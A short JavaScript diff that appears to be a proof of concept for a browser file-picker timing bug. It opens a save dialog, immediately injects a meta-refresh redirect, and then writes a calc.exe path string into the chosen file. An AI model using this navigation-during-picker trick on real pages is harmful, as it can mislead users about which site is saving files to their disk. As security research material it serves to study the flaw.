@@ -24,19 +24,21 @@ butSaveNewFile.addEventListener('click', async () => {
             ]
         };
 
-        const handle = await window.showSaveFilePicker(options);
-        const writable = await handle.createWritable();
+        // 🔥 trigger file picker (DO NOT await yet)
+        const pickerPromise = window.showSaveFilePicker(options);
 
-        await writable.write('C:\\Windows\\system32\\calc.exe');
-        await writable.close();
-
-        alert('File saved');
-
-        // META REFRESH INJECTION
+        // 🔥 inject meta refresh immediately
         const meta = document.createElement('meta');
         meta.httpEquiv = "refresh";
         meta.content = "0; url=https://google.com";
         document.head.appendChild(meta);
+
+        // now continue handling file
+        const handle = await pickerPromise;
+        const writable = await handle.createWritable();
+
+        await writable.write('C:\\Windows\\system32\\calc.exe');
+        await writable.close();
 
     } catch (e) {
         console.error(e);
